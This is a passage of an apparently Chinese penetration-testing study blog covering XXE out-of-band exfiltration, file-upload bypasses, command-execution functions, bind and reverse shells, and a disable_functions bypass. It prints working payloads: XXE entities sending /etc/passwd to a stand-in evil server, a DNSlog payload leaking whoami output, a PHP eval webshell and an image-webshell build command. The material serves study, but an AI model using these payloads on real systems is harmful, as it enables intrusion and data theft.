<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-evil-server.com/?data=%file;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>构造主 XML 请求：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-evil-server.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>发送请求：</strong></p>
<ul>
<li>当服务器解析主 XML 文件时，它会首先请求 <code>evil.dtd</code></li>
<li>解析 <code>evil.dtd</code> 后，它会读取 <code>file:///etc/passwd</code> 的内容，并将其作为 <code>%file</code> 实体的值</li>
<li>最后，它会请求 <code>%send</code> 实体，将文件内容作为 <code>GET</code> 参数发送到你的服务器</li>
</ul>
</li>
<li><p><strong>接收数据：</strong> 你会在你的服务器日志中看到类似 <code>GET /?data=root:x:0:0:root:/root:/bin/bash...</code> 的请求，从而获取 <code>/etc/passwd</code> 的内容</p>
</li>
</ol>
</li>
</ul>
<p><strong>3. 利用参数实体获取错误信息</strong></p>
<p>当无法通过 HTTP GET 请求直接传输数据时，可以利用 XML 解析器的错误信息来带出数据。这种方法通常用于绕过 WAF 或一些过滤</p>
<ul>
<li><p><strong>攻击步骤：</strong></p>
<ol>
<li><p><strong>构造恶意 DTD 文件：</strong> 在你的服务器上创建 DTD 文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY &amp;#x25; oob SYSTEM &#x27;http://your-evil-server.com/?data=%file;&#x27;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>构造主 XML 请求：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-evil-server.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">%oob;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>发送请求：</strong></p>
<ul>
<li>服务器解析主 XML 时，会首先加载 <code>evil.dtd</code></li>
<li>然后，它会尝试解析 <code>%p1</code>，其中包含 <code>%oob</code> 的定义</li>
<li>由于 <code>%oob</code> 实体引用了 <code>%file</code>，而 <code>%file</code> 是一个文件内容，当 XML 解析器尝试将其解析为 URL 时，会因为语法错误而失败，并抛出错误信息</li>
</ul>
</li>
</ol>
<ul>
<li><strong>这种方法的关键在于，某些 XML 解析器会把完整的错误信息（包括外部实体的内容）带回给客户端，或者将其写入服务器日志。</strong> 虽然不能直接从响应中看到，但可以利用这个特性进行注入</li>
</ul>
</li>
</ul>
<p><strong>4. 利用 DNSlog 获取数据</strong></p>
<p>当目标服务器无法出网，或者 HTTP 协议被严格过滤时，DNSlog 是一个非常好的选择</p>
<ul>
<li><p><strong>攻击步骤：</strong></p>
<ol>
<li><p><strong>准备 DNSlog 平台：</strong> 获取一个 DNSlog 域名，例如 <code>hacker.dnslog.cn</code></p>
</li>
<li><p><strong>构造 XML 请求：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">p1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://`whoami`.hacker.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%p1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>发送请求：</strong></p>
<ul>
<li>服务器解析 XML 时，会尝试解析 <code>whoami</code> 命令的输出，并将其作为子域名，向 <code>hacker.dnslog.cn</code> 发起 DNS 查询</li>
</ul>
</li>
<li><p><strong>查看结果：</strong> 你会在 DNSlog 平台的日志中看到类似 <code>www-data.hacker.dnslog.cn</code> 的查询记录，从而获取到 <code>whoami</code> 命令的输出</p>
</li>
</ol>
<hr>
<h3 id="PCDATA-和-CDATA-的区别"><a href="#PCDATA-和-CDATA-的区别" class="headerlink" title="PCDATA 和 CDATA 的区别"></a>PCDATA 和 CDATA 的区别</h3></li>
</ul>
<p><strong>PCDATA</strong></p>
<p>PCDATA 是 <strong>可解析字符数据</strong>。在XML或HTML中，当解析器遇到 PCDATA 时，它会解析其中的特殊字符。这意味着，如果你的数据中包含 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等字符，解析器会将其视为标签或实体的开始</p>
<p>例如，在XML中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>这是一个 <span class="symbol">&amp;lt;</span>b<span class="symbol">&amp;gt;</span>粗体<span class="symbol">&amp;lt;</span>/b<span class="symbol">&amp;gt;</span> 文本。<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的 <code>&lt;</code> 会被解析成 <code>&lt;</code>，<code>&gt;</code> 会被解析成 <code>&gt;</code>。如果你在XML元素中直接写入 <code>&lt;script&gt;</code> 标签，解析器会把它当作一个新的节点来处理，而不是纯粹的文本内容。在渗透测试中，如果一个 Web 应用将用户输入作为 PCDATA 处理，但没有进行充分的过滤，攻击者可以注入恶意代码，如 XSS (跨站脚本) 攻击</p>
<p><strong>CDATA</strong></p>
<p>CDATA 是 <strong>不可解析字符数据</strong>。与 PCDATA 相反，解析器会将其中的所有内容都视为纯文本，不会对 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等特殊字符进行解析。CDATA 块通常用 <code>&lt;![CDATA[ ... ]]&gt;</code> 语法来定义</p>
<p>例如，在XML中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script_code</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">    if (x &lt; 10 &amp;&amp; y &gt; 5) &#123;</span><br><span class="line">      alert(&#x27;Hello!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]]&gt;<span class="tag">&lt;/<span class="name">script_code</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>CDATA</code> 块内的所有内容，包括 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，都会被原封不动地当作字符串来处理。即使代码中包含了类似HTML 标签的字符，解析器也不会将它们当作标签来处理。这使得 CDATA 在需要嵌入包含特殊字符的文本（如代码片段、JavaScript 等）时非常有用</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>PCDATA (可解析字符数据)</th>
<th>CDATA (不可解析字符数据)</th>
</tr>
</thead>
<tbody><tr>
<td>解析方式</td>
<td>解析特殊字符（&lt;、&gt;、&amp; 等）</td>
<td>将所有内容视为纯文本，不解析特殊字符</td>
</tr>
<tr>
<td>主要用途</td>
<td>包含普通的、可解析的文本内容</td>
<td>包含代码、脚本或其他含有特殊字符的文本</td>
</tr>
<tr>
<td>攻击风险</td>
<td>高。如果对用户输入处理不当，容易导致 XSS、XML 实体注入等漏洞。</td>
<td>低。由于其内容被视为纯文本，它能有效防止特殊字符被解释为标签或代码。</td>
</tr>
<tr>
<td>攻击场景</td>
<td>当应用程序将用户输入直接放入PCDATA区域，而没有进行充分的转义时，攻击者可以注入 <script>alert(&#39;XSS&#39;)</script> 等代码。</td>
<td>除非应用程序对 CDATA 块本身进行了处理或二次解析，否则在 CDATA 内部直接进行注入攻击是无效的。</td>
</tr>
</tbody></table>
<h1 id="13-文件上传漏洞"><a href="#13-文件上传漏洞" class="headerlink" title="13- 文件上传漏洞"></a>13- 文件上传漏洞</h1><h3 id="文件上传漏洞绕过方法"><a href="#文件上传漏洞绕过方法" class="headerlink" title="文件上传漏洞绕过方法"></a>文件上传漏洞绕过方法</h3><p><strong>1. 客户端 JS 绕过</strong></p>
<p>这是最简单也是最常见的绕过方法。许多开发者为了方便，只在前端（浏览器）使用 JavaScript 脚本来检查文件类型，如 <code>.jpg</code>、<code>.png</code>、<code>.gif</code> 等</p>
<ul>
<li><strong>绕过方法：</strong><ul>
<li><strong>禁用 JavaScript：</strong> 在浏览器设置中直接禁用 JS，或者使用抓包工具（如 Burp Suite）拦截请求，修改文件名和内容后再发送</li>
<li><strong>抓包修改文件名：</strong> 正常上传一个合法的图片文件（<code>1.jpg</code>），然后使用 Burp Suite 拦截数据包，将文件名修改为 <code>1.php</code>。由于服务器后端没有进行二次验证，就会直接上传成功</li>
</ul>
</li>
</ul>
<p><strong>2. MIME 类型绕过</strong></p>
<p>服务器有时会通过检查 HTTP 请求头中的 <code>Content-Type</code> 字段来验证文件类型。例如，一个图片的 <code>Content-Type</code> 通常是 <code>image/jpeg</code> 或 <code>image/png</code></p>
<ul>
<li><strong>绕过方法：</strong><ul>
<li><strong>修改 <code>Content-Type</code>：</strong> 攻击者可以上传一个 <code>webshell.php</code> 文件，同时在抓包工具中将 <code>Content-Type</code> 字段从 <code>application/octet-stream</code>（默认值）修改为 <code>image/jpeg</code>。如果后端只依赖这个字段进行判断，恶意文件就会上传成功</li>
</ul>
</li>
</ul>
<p><strong>3. 文件头内容检测绕过（魔术字节）</strong></p>
<p>一些更安全的系统会检查文件的“魔术字节”（Magic Bytes），也就是文件头部的一串特定字节，用以识别文件类型。例如，JPEG 图片文件开头通常是 <code>FF D8 FF E0</code></p>
<ul>
<li><strong>绕过方法：</strong><ul>
<li><strong>“图片马”：</strong> 攻击者可以将恶意代码嵌入到图片文件中，制作成一个“图片马”</li>
<li><strong>制作方法：</strong><ol>
<li>准备一张正常的图片（<code>1.jpg</code>）和一个包含恶意代码的文本文件（<code>shell.php</code>），内容为 <code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
<li>使用命令将两者合并：<code>copy 1.jpg/b + shell.php/a webshell.jpg</code></li>
</ol>
</li>
<li><strong>利用方式：</strong><ol>
<li>上传 <code>webshell.jpg</code> 文件。如果服务器检查了文件头，但没有检查文件内容，就会上传成功。</li>
<li>然后，攻击者需要找到一种方法来解析这个图片文件，使其作为 PHP 代码执行。这通常需要结合 <strong>文件包含漏洞（LFI）</strong> 来实现，例如 <code>include(&#39;webshell.jpg&#39;)</code>，或者一些服务器配置错误（如 Apache 的 <code>.htaccess</code> 配置）</li>
</ol>
</li>
</ul>
</li>
</ul>
<p><strong>4. 文件名、路径绕过</strong></p>
<p>服务器通常会有一份黑名单或白名单来限制可上传的文件扩展名。黑名单会阻止 <code>.php</code>, <code>.asp</code>, <code>.jsp</code> 等脚本文件，而白名单只允许 <code>.jpg</code>, <code>.png</code>, <code>.gif</code> 等图片文件</p>
<p>​	<strong>a. 黑名单绕过</strong></p>
<ul>
<li><strong>大小写绕过：</strong> <code>shell.Php</code>、<code>shell.pHP</code> 等</li>
<li><strong>文件后缀名加空格或点：</strong> 在 Windows IIS 服务器上，文件名末尾的空格或点会被自动去除<ul>
<li><code>shell.php </code>（空格）</li>
<li><code>shell.php.</code>（点）</li>
</ul>
</li>
<li><strong>双重扩展名：</strong> 某些服务器只检查最后一个扩展名<ul>
<li><code>shell.php.jpg</code>：上传后，如果服务器处理不当，可能会被当做 <code>shell.php</code> 来执行。</li>
</ul>
</li>
<li><strong>特殊字符绕过：</strong> 利用一些特殊字符，如 <code>shell.php%00.jpg</code>（00 截断）<ul>
<li><strong>00截断：</strong> 在 PHP 5.3 之前，PHP 的 <code>move_uploaded_file()</code> 函数在处理文件名时，遇到 <code>0x00</code> 字节会截断后面的内容。攻击者可以在文件名中注入 <code>%00</code>，如 <code>shell.php%00.jpg</code>，上传时，服务器只检查 <code>.jpg</code>，但实际保存的文件名是 <code>shell.php</code></li>
</ul>
</li>
</ul>
<p>​	<strong>b. 白名单绕过</strong></p>
<ul>
<li><strong>服务器解析漏洞：</strong><ul>
<li><strong>Apache：</strong> 如果服务器配置了 <code>AddHandler php5-script .jpg</code>，那么所有 <code>.jpg</code> 文件都会被当作 PHP 脚本来解析</li>
<li><strong>IIS 6.0：</strong> 目录解析漏洞，例如 <code>/xx.asp/shell.jpg</code>。服务器会把 <code>shell.jpg</code> 当作 ASP 脚本执行</li>
<li><strong>IIS 7.0&#x2F;7.5：</strong> <code>web.config</code> 配置文件解析漏洞。攻击者可以上传一个恶意的 <code>web.config</code> 文件来改变目录的解析规则</li>
</ul>
</li>
<li><strong>竞争条件（Race Condition）：</strong><ul>
<li>一些服务器在处理文件上传时，会先将文件临时保存，然后进行安全检查，最后再重命名或移动到目标目录</li>
<li><strong>利用方法：</strong> 攻击者可以利用这个时间差，在文件被检查并删除之前，迅速访问该文件</li>
<li><strong>步骤：</strong><ol>
<li>上传一个包含恶意代码的脚本文件（如 <code>shell.php</code>），其中恶意代码会创建一个新的 Webshell 文件</li>
<li>在文件上传成功后，但在服务器删除它之前，通过一个脚本循环快速访问该文件</li>
<li>恶意脚本被执行，并创建一个新的、无法被删除的 Webshell 文件</li>
</ol>
</li>
</ul>
</li>
</ul>
<h1 id="14-RCE-系列"><a href="#14-RCE-系列" class="headerlink" title="14- RCE 系列"></a>14- RCE 系列</h1><h3 id="代码执行、命令执行的函数有哪些"><a href="#代码执行、命令执行的函数有哪些" class="headerlink" title="代码执行、命令执行的函数有哪些"></a>代码执行、命令执行的函数有哪些</h3><p><strong>PHP</strong></p>
<p>在 PHP 中，有很多函数可以执行系统命令或代码。它们是 PHP 漏洞利用中最常见的攻击入口</p>
<p><strong>命令执行函数</strong></p>
<ul>
<li><p><code>exec()</code>: 执行一个外部程序，不返回输出结果，通常需要使用参数获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>passthru()</code>: 直接将命令的输出传递到浏览器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;ls -la&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>shell_exec()</code>: 通过 shell 执行命令，并将整个输出结果作为字符串返回</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>system()</code>: 执行外部程序并显示输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;netstat -an&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>popen()</code> 和 <code>proc_open()</code>: 都可以打开一个进程文件指针，允许对进程进行双向 I&#x2F;O 操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$handle = popen(&#x27;ls&#x27;, &#x27;r&#x27;);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pcntl_exec()</code>: 在 PHP CLI 环境中，用新的程序替换当前进程</p>
</li>
</ul>
<p><strong>代码执行函数</strong></p>
<ul>
<li><p><code>eval()</code>: 将字符串作为 PHP 代码来执行。这是最常见的代码执行漏洞函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>assert()</code>: 在 PHP 7.2 之前，<code>assert()</code> 函数可以执行字符串参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>create_function()</code>: 用于创建一个匿名函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;return &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>call_user_func()</code> 和 <code>call_user_func_array()</code>: 调用一个用户函数，如果参数是用户可控的，可以用来执行任意函数</p>
</li>
<li><p><code>array_map()</code>: 将回调函数作用到给定数组的每个元素上</p>
</li>
<li><p><code>unserialize()</code>: 反序列化函数，如果序列化数据中包含一个恶意对象，可以导致对象注入，从而触发魔术方法（如 <code>__destruct()</code>），最终实现代码执行</p>
</li>
</ul>
<p><strong>Python</strong></p>
<p>Python 的 Web 应用中也经常出现类似的问题</p>
<p><strong>命令执行函数</strong></p>
<ul>
<li><p><code>os.system()</code>: 执行 shell 命令</p>
</li>
<li><p><code>os.popen()</code>: 执行 shell 命令，并返回一个文件对象</p>
</li>
<li><p><code>subprocess</code> 模块: 这是更安全、更现代的模块，但如果参数处理不当，同样会造成命令注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">cmd = <span class="string">&#x27;ls &#x27;</span> + user_input</span><br><span class="line">subprocess.call(cmd, shell=<span class="literal">True</span>) <span class="comment"># 当 shell=True 时，可能存在命令注入</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>代码执行函数</strong></p>
<ul>
<li><p><code>eval()</code>: 将字符串作为表达式来执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;1 + 1&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>exec()</code>: 执行动态代码</p>
</li>
<li><p><code>pickle.loads()</code>: 反序列化模块，如果反序列化恶意数据，可能导致代码执行</p>
</li>
</ul>
<p><strong>Java</strong></p>
<p>在 Java 中，直接执行系统命令的函数相对较少，但依然存在</p>
<p><strong>命令执行函数</strong></p>
<ul>
<li><p><code>Runtime.getRuntime().exec()</code>: 在单独的进程中执行指定的字符串命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;ls -la&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>java.lang.ProcessBuilder</code>: 创建一个操作系统进程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-la&quot;</span>).start();</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>代码执行</strong></p>
<ul>
<li><code>ScriptEngine</code>：Java 脚本引擎，可以执行 JavaScript 等脚本语言</li>
<li>反序列化：Java 的反序列化漏洞通常是由于 <code>readObject()</code> 方法处理不当，结合 <code>Commons-Collections</code> 等库中的链式调用，最终实现命令执行</li>
</ul>
<hr>
<h3 id="正向-Shell-和反向-Shell-的区别"><a href="#正向-Shell-和反向-Shell-的区别" class="headerlink" title="正向 Shell 和反向 Shell 的区别"></a>正向 Shell 和反向 Shell 的区别</h3><p><strong>正向 Shell (Bind Shell)</strong></p>
<p><strong>工作原理</strong></p>
<ol>
<li>攻击者在目标主机上执行恶意代码，该代码会开启一个端口并监听，等待连接</li>
<li>攻击者随后从自己的机器上，向目标主机的这个监听端口发起连接</li>
<li>一旦连接建立，攻击者就可以通过这个连接发送命令，并在自己的终端上接收目标主机的输出</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A[攻击者] --主动发起连接--&gt; B[目标主机: 监听端口]</span><br><span class="line">B --命令输出--&gt; A</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li><strong>简单</strong>：一旦端口在目标主机上打开，攻击者就可以直接连接。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>防火墙限制</strong>：这是正向 Shell 最大的问题。许多企业和家庭网络都部署了防火墙，会阻止来自外部的入站连接。目标主机的端口通常是关闭的，或者被严格限制</li>
<li><strong>IP 地址不确定</strong>：如果目标主机的 IP 是动态的，攻击者很难持续连接</li>
</ul>
<p><strong>反向 Shell (Reverse Shell)</strong></p>
<p><strong>工作原理</strong></p>
<ol>
<li>攻击者首先在自己的机器上，开启一个端口并监听，等待连接</li>
<li>攻击者在目标主机上执行恶意代码，该代码会主动连接攻击者的监听端口</li>
<li>一旦连接建立，攻击者就可以通过这个连接向目标主机发送命令，并接收命令输出</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A[攻击者: 监听端口] --等待连接--&gt; B[目标主机]</span><br><span class="line">B --主动发起连接--&gt; A</span><br><span class="line">A --命令--&gt; B</span><br><span class="line">B --命令输出--&gt; A</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li><strong>绕过防火墙</strong>：这是反向 Shell 最大的优势。防火墙通常只阻止入站连接，但允许内部主机向外部发起出站连接。这使得反向 Shell 能够轻松穿透大多数防火墙</li>
<li><strong>IP 地址不确定</strong>：即使目标主机的 IP 是动态的，只要它能主动连接到攻击者的固定 IP 地址，连接就可以成功建立</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>复杂性</strong>：攻击者需要有一个公网 IP 或能够通过端口转发，才能在自己的机器上成功监听</li>
</ul>
<hr>
<h3 id="正向-Shell-和反向-Shell-的区别-1"><a href="#正向-Shell-和反向-Shell-的区别-1" class="headerlink" title="正向 Shell 和反向 Shell 的区别"></a>正向 Shell 和反向 Shell 的区别</h3><p><strong>正向 Shell (Bind Shell)</strong></p>
<p><strong>工作原理</strong></p>
<ol>
<li>攻击者在目标主机上执行恶意代码，该代码会开启一个端口并监听，等待连接</li>
<li>攻击者随后从自己的机器上，向目标主机的这个监听端口发起连接</li>
<li>一旦连接建立，攻击者就可以通过这个连接发送命令，并在自己的终端上接收目标主机的输出</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A[攻击者] --主动发起连接--&gt; B[目标主机: 监听端口]</span><br><span class="line">B --命令输出--&gt; A</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li><strong>简单</strong>：一旦端口在目标主机上打开，攻击者就可以直接连接。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>防火墙限制</strong>：这是正向 Shell 最大的问题。许多企业和家庭网络都部署了防火墙，会阻止来自外部的入站连接。目标主机的端口通常是关闭的，或者被严格限制</li>
<li><strong>IP 地址不确定</strong>：如果目标主机的 IP 是动态的，攻击者很难持续连接</li>
</ul>
<p><strong>反向 Shell (Reverse Shell)</strong></p>
<p><strong>工作原理</strong></p>
<ol>
<li>攻击者首先在自己的机器上，开启一个端口并监听，等待连接</li>
<li>攻击者在目标主机上执行恶意代码，该代码会主动连接攻击者的监听端口</li>
<li>一旦连接建立，攻击者就可以通过这个连接向目标主机发送命令，并接收命令输出</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A[攻击者: 监听端口] --等待连接--&gt; B[目标主机]</span><br><span class="line">B --主动发起连接--&gt; A</span><br><span class="line">A --命令--&gt; B</span><br><span class="line">B --命令输出--&gt; A</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li><strong>绕过防火墙</strong>：这是反向 Shell 最大的优势。防火墙通常只阻止入站连接，但允许内部主机向外部发起出站连接。这使得反向 Shell 能够轻松穿透大多数防火墙</li>
<li><strong>IP 地址不确定</strong>：即使目标主机的 IP 是动态的，只要它能主动连接到攻击者的固定 IP 地址，连接就可以成功建立</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>复杂性</strong>：攻击者需要有一个公网 IP 或能够通过端口转发，才能在自己的机器上成功监听</li>
</ul>
<hr>
<h3 id="PHP-disable-functions-绕过方法"><a href="#PHP-disable-functions-绕过方法" class="headerlink" title="PHP disable_functions() 绕过方法"></a>PHP disable_functions() 绕过方法</h3><p><strong>1. LD_PRELOAD 环境变量劫持</strong></p>
<p><strong>原理：</strong> <code>LD_PRELOAD</code> 是一个环境变量，它允许用户在程序运行前指定一个或多个动态链接库（.so文件）。这些库中的函数会优先于系统默认的库被加载。我们可以利用这一点，编写一个恶意的动态链接库，其中包含一个与常用系统函数（如 <code>getuid</code>、<code>geteuid</code> 等）同名的恶意函数</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>编写一个 C 语言恶意代码，利用 <code>__attribute__((constructor))</code> 在库加载时执行系统命令，并将其编译成一个 <code>.so</code> 文件</li>
<li>在 PHP 中，通过 <strong><code>putenv()</code></strong> 函数设置 <code>LD_PRELOAD</code> 环境变量，指向我们恶意的 <code>.so</code> 文件</li>
<li>触发一个可以调用系统函数的 PHP 函数，例如 <code>mail()</code> 或 <code>exec()</code>。当这个函数被调用时，<code>LD_PRELOAD</code> 就会生效，我们的恶意代码会被执行</li>
</ol>
<p>这种方法非常有效，但前提是 <code>putenv()</code> 或类似的函数没有被禁用，并且目标服务器支持动态链接</p>
<p><strong>2. ImageMagick 命令执行漏洞</strong></p>
